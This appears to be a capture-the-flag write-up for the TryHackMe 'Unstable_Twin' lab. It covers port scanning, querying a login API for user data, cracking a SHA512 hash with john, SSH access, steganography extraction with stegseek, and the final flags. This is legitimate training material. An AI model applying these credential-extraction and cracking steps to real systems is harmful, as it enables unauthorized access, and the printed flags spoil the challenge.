# Unstable_Twin 

> VOiD | Thursday 10 March 2022 05:31:10 AM UTC

My IP : 10.8.253.221
Target IP : 10.10.162.144


## Rustscan
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```


## PORT 80 [http]
```bash
curl -I http://10.10.162.144/info                                          130 ⨯
HTTP/1.1 200 OK
Server: nginx/1.14.1
Date: Thu, 10 Mar 2022 05:53:05 GMT
Content-Type: application/json
Content-Length: 160
Connection: keep-alive
Build Number: 1.3.4-dev
Server Name: Vincent

HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 148
Content-Type: application/json
Date: Thu, 10 Mar 2022 05:55:26 GMT
Server: nginx/1.14.1

"The login API needs to be called with the username and password fields.  It has not been fully tested yet so may not be full developed and secure"

http://10.10.162.144/api/login


python3 requester.py
[
  [
    "julias", 
    "Red"
  ], 
  [
    "linda", 
    "Green"
  ], 
  [
    "marnie", 
    "Yellow "
  ], 
  [
    "mary_ann", 
    "continue..."
  ], 
  [
    "vincent", 
    "Orange"
  ]
]

john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512

experiment
```

## USER [mary_ann]
```bash
[mary_ann@UnstableTwin ~]$ cat user.flag 
THM{Mary_Ann_notes}
[mary_ann@UnstableTwin ~]$ cat server_notes.txt 
Now you have found my notes you now you need to put my extended family together.

We need to GET their IMAGE for the family album.  These can be retrieved by NAME.

You need to find all of them and a picture of myself!

stegseek Twins-Arnold-Schwarzenegger.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "julias.txt".
[i] Extracting to "Twins-Arnold-Schwarzenegger.jpg.out".

cat Twins-Arnold-Schwarzenegger.jpg.out                                     
Red - 1DVsdb2uEE0k5HK4GAIZ

stegseek Twins-Bonnie-Bartlett.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "mary_ann.txt".
[i] Extracting to "Twins-Bonnie-Bartlett.jpg.out".

cat Twins-Bonnie-Bartlett.jpg.out 
You need to find all my children and arrange in a rainbow!

stegseek Twins-Chloe-Webb.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "linda.txt".
[i] Extracting to "Twins-Chloe-Webb.jpg.out".

cat Twins-Chloe-Webb.jpg.out 
Green - eVYvs6J6HKpZWPG8pfeHoNG1 

stegseek Twins-Danny-DeVito.jpg Twins-Kelly-Preston.jpg 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "vincent.txt".
[i] Extracting to "Twins-Danny-DeVito.jpg.out".



stegseek Twins-Kelly-Preston.jpg                       
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "marine.txt".
[i] Extracting to "Twins-Kelly-Preston.jpg.out".


cat Twins-Danny-DeVito.jpg.out Twins-Kelly-Preston.jpg.out 
Orange - PS0Mby2jomUKLjvQ4OSw
Yellow - jKLNAAeCdl2J8BCRuXVX
Green - eVYvs6J6HKpZWPG8pfeHoNG1 


```

## Colors
```bash
You need to find all my children and arrange in a rainbow!
VIBGOYR
Red - 1DVsdb2uEE0k5HK4GAIZ
Green - eVYvs6J6HKpZWPG8pfeHoNG1 
Orange - PS0Mby2jomUKLjvQ4OSw
Yellow - jKLNAAeCdl2J8BCRuXVX


1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1

from base62
You have found the final flag THM{The_Family_Is_Back_Together}
```